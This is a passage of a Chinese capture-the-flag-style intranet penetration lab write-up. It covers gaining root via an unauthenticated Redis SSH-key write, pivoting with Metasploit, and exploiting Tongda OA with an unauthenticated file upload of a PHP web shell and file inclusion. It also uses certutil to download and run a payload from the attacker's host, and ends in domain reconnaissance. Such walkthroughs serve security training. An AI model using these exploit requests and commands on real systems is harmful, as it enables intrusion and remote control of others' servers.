<p>然后将公钥导入key.txt文件(前后用\n换行，避免和Redis里其他缓存数据混合)，再把key.txt文件内容写入目标主机的redis缓冲里</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">(<span class="hljs-keyword">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>; cat /root/.ssh/id_rsa.pub; <span class="hljs-keyword">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>) &gt; key.txt<br>cat key.txt | redis-cli -h <span class="hljs-number">192.168</span>.<span class="hljs-number">1.8</span> -x set xxx<br><br><span class="hljs-comment">// -x 代表从标准输入读取数据作为该命令的最后一个参数。</span><br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689779259670-bc568131-4c65-47bd-86aa-e5fd12f50ab0.png#averageHue=%23181a1d&clientId=uaaa1bc18-8993-4&from=paste&height=111&id=ua9b69f72&originHeight=111&originWidth=678&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9247&status=done&style=none&taskId=ubfc1b86e-3e91-4a81-83fa-e3143038bff&title=&width=678" alt="image.png"><br>攻击机连接目标机器Redis，分别执行如下命令将ssh公钥写入目标主机</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">config set dir /root/.ssh    <span class="hljs-comment"># 设置redis的备份路径为/root/.ssh/</span><br>config set dbfilename authorized_keys    <span class="hljs-comment"># 设置保存文件名为authorized_keys</span><br>save    <span class="hljs-comment"># 将数据保存在目标服务器硬盘上</span><br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689779283947-a657f701-a51c-4ea1-a4c8-4a9b3b102ad6.png#averageHue=%23181a1c&clientId=uaaa1bc18-8993-4&from=paste&height=217&id=u858ce829&originHeight=217&originWidth=557&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10490&status=done&style=none&taskId=ud027fa8e-7551-4a39-aea1-79cf9a9ea8f&title=&width=557" alt="image.png"><br>然后直接使用 ssh  10.10.10.10 直接连接<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689779311982-1cf974c2-4534-49b2-9d13-b779d2f7ba60.png#averageHue=%231b1d1f&clientId=uaaa1bc18-8993-4&from=paste&height=701&id=udb824ee2&originHeight=701&originWidth=759&originalType=binary&ratio=1&rotation=0&showTitle=false&size=66953&status=done&style=none&taskId=u6a76ae19-bbfc-4ac3-9cc2-2cb1ca682ed&title=&width=759" alt="image.png"><br>这台redis 才是 10.10.10.10 IP的主机 ，到现在已经获取两台主机了<br>切都是root权限<br>看来目标网站应该是做了反向代理，查看Nginx 的配置文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689779612646-b1ea1af5-7454-4518-977a-3b08a7bc3d99.png#averageHue=%2318191b&clientId=uaaa1bc18-8993-4&from=paste&height=330&id=u2806aa63&originHeight=330&originWidth=777&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20971&status=done&style=none&taskId=u00540d9b-6da0-49f8-ae6b-ca868eefd5a&title=&width=777" alt="image.png"></p>
<p>81端口，就是指向的是一开始那台带有docker容器的ubuntu<br>两台Ubuntu 主机 一台Nginx反向代理 ，一台web服务器</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">DMZ区域的Ubuntu <span class="hljs-number">18</span>：<span class="hljs-number">192.168</span>.<span class="hljs-number">1.8</span><br>第二层网络的Ubuntu <span class="hljs-number">14</span>：<span class="hljs-number">192.168</span>.<span class="hljs-number">52.20</span><br></code></pre></td></tr></table></figure>

<p><a name="u8ddX"></a></p>
<h1><span id="内网">内网</span></h1><p>在DMZ区的ubuntu 上面搭建一个代理 。然后把这个shell 传给msf<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689781373584-e74d7b55-59d5-48b6-bf1b-871cfe512d41.png#averageHue=%231a1b1d&clientId=uaaa1bc18-8993-4&from=paste&height=134&id=u77da37be&originHeight=134&originWidth=841&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14599&status=done&style=none&taskId=u2e85797e-1df6-40e6-90f4-39844448058&title=&width=841" alt="image.png"><br>添加一个通往192.168.52.0 的 路由<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689781528198-283a476d-6340-46e4-8f60-d4c0867aae06.png#averageHue=%2317181a&clientId=uaaa1bc18-8993-4&from=paste&height=918&id=u01115261&originHeight=918&originWidth=1954&originalType=binary&ratio=1&rotation=0&showTitle=false&size=134913&status=done&style=none&taskId=uaf9082a6-3dfd-4d5e-a20e-53799727dd2&title=&width=1954" alt="image.png"><br>kali 本地我也搭建了路由的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689781563392-b70e396b-b1a9-450f-abcf-52591df6c610.png#averageHue=%2317181a&clientId=uaaa1bc18-8993-4&from=paste&height=738&id=u8e49585e&originHeight=738&originWidth=1994&originalType=binary&ratio=1&rotation=0&showTitle=false&size=84305&status=done&style=none&taskId=u3189d04f-2dbb-4889-948a-06f187be5a9&title=&width=1994" alt="image.png"><br>使用metasploit的 auxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_probe 模块来扫描第二层网络中的主机存活</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">auxiliary</span>/<span class="hljs-title">scanner</span>/<span class="hljs-title">discovery</span>/<span class="hljs-title">udp_probe</span><br><span class="hljs-title">set</span> <span class="hljs-title">rhosts</span> 192.168.52.1-255<br><span class="hljs-title">set</span> <span class="hljs-title">threads</span> 5<br><span class="hljs-title">run</span><br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689781704449-5f7a0e40-17e8-4964-bcb0-007a94df0a0d.png#averageHue=%2317181a&clientId=uaaa1bc18-8993-4&from=paste&height=443&id=ubf37af44&originHeight=443&originWidth=2250&originalType=binary&ratio=1&rotation=0&showTitle=false&size=94085&status=done&style=none&taskId=u2980efa5-2e95-49ad-97a9-ddd186dfba6&title=&width=2250" alt="image.png"><br>很快就探索出一台了 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689781826662-ad1def3f-f6d2-4965-bd8f-6722d496b635.png#averageHue=%23181a1c&clientId=uaaa1bc18-8993-4&from=paste&height=534&id=ubd5afcc8&originHeight=534&originWidth=2881&originalType=binary&ratio=1&rotation=0&showTitle=false&size=164512&status=done&style=none&taskId=u8cc3f8af-0da0-4a79-b83d-ddafa2ccedf&title=&width=2881" alt="image.png"><br>就探测出192.168.52.30 这台主机 ，</p>
<p><a name="iMF5B"></a></p>
<h2><span id="防火墙问题">防火墙问题</span></h2><p>这里不管是搭建什么代理 ，一开始搭建的 Venom ，不行我还以为是软件出问题了不支持，又换了frp，结果还是超时，然后看了别人使用ew 我也用了还是超时 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689785895263-752477c9-8d7d-40fb-9d64-4282dadc56bf.png#averageHue=%231a1b1d&clientId=uaaa1bc18-8993-4&from=paste&height=686&id=u72489103&originHeight=686&originWidth=1838&originalType=binary&ratio=1&rotation=0&showTitle=false&size=217801&status=done&style=none&taskId=uef568b62-dbfe-4a42-b76c-5da8cb33464&title=&width=1838" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689785916183-3d86e531-1f40-4f04-96be-551d43afe568.png#averageHue=%2318191b&clientId=uaaa1bc18-8993-4&from=paste&height=1058&id=u852fee0f&originHeight=1058&originWidth=1693&originalType=binary&ratio=1&rotation=0&showTitle=false&size=241034&status=done&style=none&taskId=uabb9f367-395a-4454-a8b2-adb3c4a638e&title=&width=1693" alt="image.png"><br>只能说ew 在这里还不错 ，在web端的OA系统他起码能访问到一点界面 <br>kali端 访问出来是这个 ，这个也看不出来是这个啥东西 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689785988769-7250c6c8-b090-4823-b919-e1e8546f9c37.png#averageHue=%231e1d24&clientId=uaaa1bc18-8993-4&from=paste&height=681&id=u262a93fa&originHeight=681&originWidth=1271&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32162&status=done&style=none&taskId=ud144632a-00dc-497d-8791-95c0aaa3bcd&title=&width=1271" alt="image.png"><br>他这台win7 PC1 的 防火墙是有点问题的 <br>然后使用MSF 测试 是否存在 ms17-010 漏洞 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689833501493-78fa3794-0656-4590-ad7e-fd86af443e50.png#averageHue=%2317181a&clientId=u6b88bf9e-b457-4&from=paste&height=176&id=u1403b165&originHeight=352&originWidth=2164&originalType=binary&ratio=2&rotation=0&showTitle=false&size=94796&status=done&style=none&taskId=uac273993-f2fd-4286-a98c-f523d52f59c&title=&width=1082" alt="image.png">然后去进行测试。ms17-010 漏洞<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689833580214-c0110907-c0de-4c0f-b6af-e1246b454615.png#averageHue=%23191a1c&clientId=u6b88bf9e-b457-4&from=paste&height=454&id=uc8d17593&originHeight=907&originWidth=1866&originalType=binary&ratio=2&rotation=0&showTitle=false&size=242248&status=done&style=none&taskId=uc11cc246-bf74-40b3-ade0-2e4d180e380&title=&width=933" alt="image.png"><br>还是不成功 ，接着想使用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">auxiliary</span>(admin/smb/ms17_010_command) 模块<br></code></pre></td></tr></table></figure>
<p>去执行命令 ，<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689833638695-cf95a379-93c5-44f3-b1e1-dcf66160936a.png#averageHue=%2317181a&clientId=u6b88bf9e-b457-4&from=paste&height=531&id=u10583b99&originHeight=1062&originWidth=2539&originalType=binary&ratio=2&rotation=0&showTitle=false&size=253404&status=done&style=none&taskId=uc631afb2-ac46-4252-92a7-aa7de78a009&title=&width=1269.5" alt="image.png"><br>结果还是无效 （。。。。。）<br><a name="OOrsU"></a></p>
<h3><span id="被迫关闭防火墙技术不到啊哭死">被迫关闭防火墙（技术不到啊，哭死）</span></h3><p>搭建代理 进行端口扫描 看看部署了啥服务 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">proxychains nmap -sT -Pn -sV  <span class="hljs-number">192.168</span>.<span class="hljs-number">52.30</span> -F <br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689833984964-707c427a-2fdf-4aeb-9f38-c270fdf356c9.png#averageHue=%2318191b&clientId=u6b88bf9e-b457-4&from=paste&height=688&id=u333cdb26&originHeight=1375&originWidth=2106&originalType=binary&ratio=2&rotation=0&showTitle=false&size=334229&status=done&style=none&taskId=u579188f6-36be-42d2-b3f7-38042d40880&title=&width=1053" alt="image.png"><br>有一个8080 端口，是web服务 ，还是部署了Nginx的<br><a name="f6M6S"></a></p>
<h2><span id="第三台-win7">第三台 Win7</span></h2><p><a name="wMskx"></a></p>
<h3><span id="通达oa">通达OA</span></h3><p>访问 <a target="_blank" rel="noopener" href="http://192.168.52.30:8080/">http://192.168.52.30:8080/</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689834065701-d8a9d8fd-a40c-4c10-8382-94ba6c347c15.png#averageHue=%23e98861&clientId=u6b88bf9e-b457-4&from=paste&height=668&id=uc20d34cf&originHeight=1336&originWidth=2465&originalType=binary&ratio=2&rotation=0&showTitle=false&size=2012144&status=done&style=none&taskId=u509e0596-584c-4b7d-a83f-402fd3f993d&title=&width=1232.5" alt="image.png"><br>欧 OA系统，通达OA存在很多漏洞的。<br>可以查看peiqi大佬的wiki 看是否存在漏洞 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689834216332-2af5c2a9-3c08-47de-b038-2b767cb7f4e9.png#averageHue=%23fafafa&clientId=u6b88bf9e-b457-4&from=paste&height=671&id=u13783821&originHeight=1342&originWidth=2749&originalType=binary&ratio=2&rotation=0&showTitle=false&size=344778&status=done&style=none&taskId=u3813f1a5-33ec-403b-8ba1-02b62230036&title=&width=1374.5" alt="image.png"><br>先查看这个OA系统是那个版本再对其查看相应漏洞<br><a target="_blank" rel="noopener" href="http://192.168.52.30:8080/inc/expired.php">http://192.168.52.30:8080/inc/expired.php</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689834573717-d11f1c13-af8d-4c88-a7d8-4b62a6c232c3.png#averageHue=%23f6f5f4&clientId=u6b88bf9e-b457-4&from=paste&height=482&id=u8500751f&originHeight=963&originWidth=1500&originalType=binary&ratio=2&rotation=0&showTitle=false&size=156181&status=done&style=none&taskId=uccbbce03-0e71-4754-b250-83b14c30044&title=&width=750" alt="image.png"><br>是存在漏洞的 ，要进行漏洞组合利用，先任意用户登录，再进行文件上传，然后文件包含 。<br><a name="gXifx"></a></p>
<h4><span id="漏洞复现">漏洞复现</span></h4><p>登录出进行抓包<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689835300997-bb2e2ddf-3f66-440f-a5af-22472e0e6ac3.png#averageHue=%23f9f7f7&clientId=u6b88bf9e-b457-4&from=paste&height=501&id=u89547317&originHeight=1002&originWidth=940&originalType=binary&ratio=2&rotation=0&showTitle=false&size=104869&status=done&style=none&taskId=u9f446239-c664-465e-a83b-5af94c19d92&title=&width=470" alt="image.png"><br>然后替换php文件为&#x2F;logincheck_code.php，删除cookie ，在post内容后添加一个&amp;UID&#x3D;1 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689835491202-a914bcc5-9274-4546-ba25-335ac75f7046.png#averageHue=%23f9f8f7&clientId=u6b88bf9e-b457-4&from=paste&height=512&id=u09a11880&originHeight=1024&originWidth=1758&originalType=binary&ratio=2&rotation=0&showTitle=false&size=182410&status=done&style=none&taskId=uaebb4981-c40f-45ea-8e92-3da5113df26&title=&width=879" alt="image.png"><br>这样可以获取一个cookie  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Set-Cookie: PHPSESSID=<span class="hljs-number">2210</span>hf2go2dr6bthdem1stfik1; path=/<br></code></pre></td></tr></table></figure>
<p>用获取的SESSID访问&#x2F;general&#x2F;<br>这里我存在不管怎么替换cookie都不可以绕过登录，我以前是复现过通达OA v11.5 这个不行我这里 ，尝试后面存在的未授权任意文件上传<br><a name="XTkVn"></a></p>
<h4><span id="未授权文件上传文件包含"><strong>未授权文件上传+文件包含</strong></span></h4><p>任意文件上传漏洞 点存在于 &#x2F;ispirit&#x2F;im&#x2F;upload.php<br>POC</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php">POST /ispirit/im/upload.php HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">52.30</span>:<span class="hljs-number">8080</span><br>Content-Length: <span class="hljs-number">660</span><br>Cache-Control: no-cache<br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">80.0</span>.<span class="hljs-number">3987.132</span> Safari/<span class="hljs-number">537.36</span><br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB<br>Accept: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5</span><br><span class="hljs-comment">Cookie: PHPSESSID=123</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="hljs-comment">Content-Disposition: form-data; name=&quot;UPLOAD_MODE&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">2</span><br><span class="hljs-comment">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="hljs-comment">Content-Disposition: form-data; name=&quot;P&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">123</span><br><span class="hljs-comment">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="hljs-comment">Content-Disposition: form-data; name=&quot;DEST_UID&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">1</span><br><span class="hljs-comment">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="hljs-comment">Content-Disposition: form-data; name=&quot;ATTACHMENT&quot;; filename=&quot;jpg&quot;</span><br><span class="hljs-comment">Content-Type: image/jpeg</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&lt;?php</span><br><span class="hljs-comment">$command=$_POST[&#x27;cmd&#x27;];</span><br><span class="hljs-comment">$wsh = new COM(&#x27;WScript.shell&#x27;);</span><br><span class="hljs-comment">$exec = $wsh-&gt;exec(&quot;cmd /c &quot;.$command);</span><br><span class="hljs-comment">$stdout = $exec-&gt;StdOut();</span><br><span class="hljs-comment">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="hljs-comment">echo $stroutput;</span><br><span class="hljs-comment">?&gt;</span><br><span class="hljs-comment">------WebKitFormBoundarypyfBh1YB4pV8McGB--</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure>
<p><br> 会返回路径<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689836767331-ebca670c-f014-4b45-86ec-9a6b5dd3d872.png#averageHue=%23fbfbfb&clientId=u6b88bf9e-b457-4&from=paste&height=691&id=u9ee2cf47&originHeight=1382&originWidth=2857&originalType=binary&ratio=2&rotation=0&showTitle=false&size=244240&status=done&style=none&taskId=u401f97af-dd13-4df9-97dc-9c0ba7e3a4c&title=&width=1428.5" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">+OK [vm]<span class="hljs-number">257</span>@<span class="hljs-number">2307_1632898820</span>|jpg|<span class="hljs-number">0</span>[/vm]<br>路径是  <span class="hljs-number">2308</span>/<span class="hljs-number">1632898820</span>.jpg<br></code></pre></td></tr></table></figure>
<p>在配合文件包含漏洞才能对其进行命令执行 <br>POC</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">POST /ispirit/<span class="hljs-class"><span class="hljs-keyword">interface</span>/<span class="hljs-title">gateway</span>.<span class="hljs-title">php</span> <span class="hljs-title">HTTP</span>/1.1</span><br><span class="hljs-class"><span class="hljs-title">Host</span>: 192.168.52.30:8080</span><br><span class="hljs-class"><span class="hljs-title">Connection</span>: <span class="hljs-title">keep</span>-<span class="hljs-title">alive</span></span><br><span class="hljs-class"><span class="hljs-title">Accept</span>-<span class="hljs-title">Encoding</span>: <span class="hljs-title">gzip</span>, <span class="hljs-title">deflate</span></span><br><span class="hljs-class"><span class="hljs-title">Accept</span>: */*</span><br><span class="hljs-class"><span class="hljs-title">User</span>-<span class="hljs-title">Agent</span>: <span class="hljs-title">python</span>-<span class="hljs-title">requests</span>/2.21.0</span><br><span class="hljs-class"><span class="hljs-title">Content</span>-<span class="hljs-title">Length</span>: 74</span><br><span class="hljs-class"><span class="hljs-title">Content</span>-<span class="hljs-title">Type</span>: <span class="hljs-title">application</span>/<span class="hljs-title">x</span>-<span class="hljs-title">www</span>-<span class="hljs-title">form</span>-<span class="hljs-title">urlencoded</span></span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">json</span>=</span>&#123;<span class="hljs-string">&quot;url&quot;</span>:<span class="hljs-string">&quot;/general/../../attach/im/2307/1632898820.jpg&quot;</span>&#125;&amp;cmd=whoami<br><br><br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689837040394-f9222ac5-7713-4d47-889a-ddd494733cd0.png#averageHue=%23fcf5f0&clientId=u6b88bf9e-b457-4&from=paste&height=389&id=u7b31244a&originHeight=778&originWidth=2000&originalType=binary&ratio=2&rotation=0&showTitle=false&size=89169&status=done&style=none&taskId=u12b853ff-2d40-4a85-b90e-9a9de2a7c4e&title=&width=1000" alt="image.png"><br>这是成功执行了的，ok 能执行命令<br>使用msfvenom 生成一个正向shell ，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">POST /ispirit/<span class="hljs-class"><span class="hljs-keyword">interface</span>/<span class="hljs-title">gateway</span>.<span class="hljs-title">php</span> <span class="hljs-title">HTTP</span>/1.1</span><br><span class="hljs-class"><span class="hljs-title">Host</span>: 192.168.52.30:8080</span><br><span class="hljs-class"><span class="hljs-title">Connection</span>: <span class="hljs-title">keep</span>-<span class="hljs-title">alive</span></span><br><span class="hljs-class"><span class="hljs-title">Accept</span>-<span class="hljs-title">Encoding</span>: <span class="hljs-title">gzip</span>, <span class="hljs-title">deflate</span></span><br><span class="hljs-class"><span class="hljs-title">Accept</span>: */*</span><br><span class="hljs-class"><span class="hljs-title">User</span>-<span class="hljs-title">Agent</span>: <span class="hljs-title">python</span>-<span class="hljs-title">requests</span>/2.21.0</span><br><span class="hljs-class"><span class="hljs-title">Content</span>-<span class="hljs-title">Length</span>: 151</span><br><span class="hljs-class"><span class="hljs-title">Content</span>-<span class="hljs-title">Type</span>: <span class="hljs-title">application</span>/<span class="hljs-title">x</span>-<span class="hljs-title">www</span>-<span class="hljs-title">form</span>-<span class="hljs-title">urlencoded</span></span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">json</span>=</span>&#123;<span class="hljs-string">&quot;url&quot;</span>:<span class="hljs-string">&quot;/general/../../attach/im/2307/1632898820.jpg&quot;</span>&#125;&amp;cmd=certutil -urlcache -split -f http:<span class="hljs-comment">//192.168.52.10:8000/win5550.exe c:/win5550.exe</span><br><br></code></pre></td></tr></table></figure>
<p>去访问下载  win5550.exe 这个shell 放到c盘<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689840575494-3e2967ae-ffb3-450c-8cdf-c575bbb1a3e0.png#averageHue=%23fcf6f1&clientId=u6b88bf9e-b457-4&from=paste&height=367&id=u77bc48b6&originHeight=734&originWidth=2216&originalType=binary&ratio=2&rotation=0&showTitle=false&size=106163&status=done&style=none&taskId=u57c35c7e-fb77-42ce-8272-f1fb5092309&title=&width=1108" alt="image.png"><br>然后去执行它<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689840598294-a16f7cc2-ceff-4929-a422-994ad421d46b.png#averageHue=%23fdfdfd&clientId=u6b88bf9e-b457-4&from=paste&height=395&id=u675675a8&originHeight=789&originWidth=1925&originalType=binary&ratio=2&rotation=0&showTitle=false&size=56757&status=done&style=none&taskId=ue719b9c7-5f13-440a-804e-ec41d10c507&title=&width=962.5" alt="image.png"><br>回弹shell<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689840623796-929dedba-d0a4-4e79-b700-c27cc8ed424c.png#averageHue=%2317181a&clientId=u6b88bf9e-b457-4&from=paste&height=395&id=u224a9bee&originHeight=789&originWidth=2237&originalType=binary&ratio=2&rotation=0&showTitle=false&size=116640&status=done&style=none&taskId=u7cc93571-3a6c-4f53-ad14-0a61af68286&title=&width=1118.5" alt="image.png"><br>成功上线 win7 了 ，</p>
<p><a name="jTtwK"></a></p>
<h2><span id="信息搜集-域">信息搜集 域</span></h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689840854271-47dc3e4b-6a15-4288-b29c-b183d6a4638c.png#averageHue=%2317181a&clientId=u6b88bf9e-b457-4&from=paste&height=810&id=u7c60578c&originHeight=1619&originWidth=2525&originalType=binary&ratio=2&rotation=0&showTitle=false&size=317731&status=done&style=none&taskId=u5264c56f-ddb0-4b32-b698-202ab247c84&title=&width=1262.5" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">存在网段 <br><span class="hljs-number">192.168</span>.<span class="hljs-number">93.0</span>/<span class="hljs-number">24</span> <br><span class="hljs-number">192.168</span>.<span class="hljs-number">52.0</span>/<span class="hljs-number">24</span><br>域名  whoamianony.org<br></code></pre></td></tr></table></figure>
<p>想通过ping  域名来定位域控结果好像不行 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689841105823-7473fbfe-94d4-4a01-b030-df2c168d3880.png#averageHue=%2318191b&clientId=u6b88bf9e-b457-4&from=paste&height=165&id=u56bae208&originHeight=330&originWidth=1534&originalType=binary&ratio=2&rotation=0&showTitle=false&size=41566&status=done&style=none&taskId=u37485850-b6b6-4d2d-971f-e67f708985c&title=&width=767" alt="image.png"><br>先上传fsan 进行一波扫描<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689841595064-0c165fc3-2d3a-401a-80c0-9026b0c901d4.png#averageHue=%23191a1c&clientId=u6b88bf9e-b457-4&from=paste&height=109&id=ua5edd45e&originHeight=218&originWidth=1291&originalType=binary&ratio=2&rotation=0&showTitle=false&size=38590&status=done&style=none&taskId=u5b5a1780-9259-42ec-8824-bc411f5a7f8&title=&width=645.5" alt="image.png"><br>由于权限较低，先使用注入进程 去提升一下权限<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689841716501-9c156aea-42f7-4c22-8e28-c619d3ce99f2.png#averageHue=%2318191b&clientId=u6b88bf9e-b457-4&from=paste&height=492&id=ucea9f232&originHeight=983&originWidth=2423&originalType=binary&ratio=2&rotation=0&showTitle=false&size=302153&status=done&style=none&taskId=u0e67977a-0e81-4f8c-ae28-4f300af8940&title=&width=1211.5" alt="image.png"><br>使用fscan 进行扫描一波<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689841902145-0b2d28a9-cbdd-4cdf-9f19-e1dd5cc5eb9e.png#averageHue=%2318191b&clientId=u6b88bf9e-b457-4&from=paste&height=482&id=u28e9000f&originHeight=964&originWidth=1927&originalType=binary&ratio=2&rotation=0&showTitle=false&size=198361&status=done&style=none&taskId=ub4579c67-b386-4716-92ff-fb6d79d4193&title=&width=963.5" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">可用信息<br>*] NetBios: <span class="hljs-number">192.168</span>.<span class="hljs-number">93.20</span>   PC1.whoamianony.org                 Windows <span class="hljs-number">7</span> Professional <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span> <br>[*] NetBios: <span class="hljs-number">192.168</span>.<span class="hljs-number">93.30</span>   [+]DC DC.whoamianony.org            Windows Server <span class="hljs-number">2012</span> R2 Datacenter <span class="hljs-number">9600</span> <br>[*] NetBios: <span class="hljs-number">192.168</span>.<span class="hljs-number">93.1</span>    WORKGROUP\<span class="hljs-number">0</span>XO1                 <br>[+] <span class="hljs-number">192.168</span>.<span class="hljs-number">93.40</span>       MS17-<span class="hljs-number">010</span>        (Windows <span class="hljs-number">7</span> Professional <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span>)<br>[+] <span class="hljs-number">192.168</span>.<span class="hljs-number">93.30</span>       MS17-<span class="hljs-number">010</span>        (Windows Server <span class="hljs-number">2012</span> R2 Datacenter <span class="hljs-number">9600</span>)<br>[*] WebTitle: http:<span class="hljs-comment">//192.168.93.20:8080 code:200 len:10065  title:通达OA网络智能办公系统</span><br>[+] InfoScan:http:<span class="hljs-comment">//192.168.93.20:8080 [通达OA] </span><br>[*] WebTitle: http:<span class="hljs-comment">//192.168.93.1       code:200 len:0      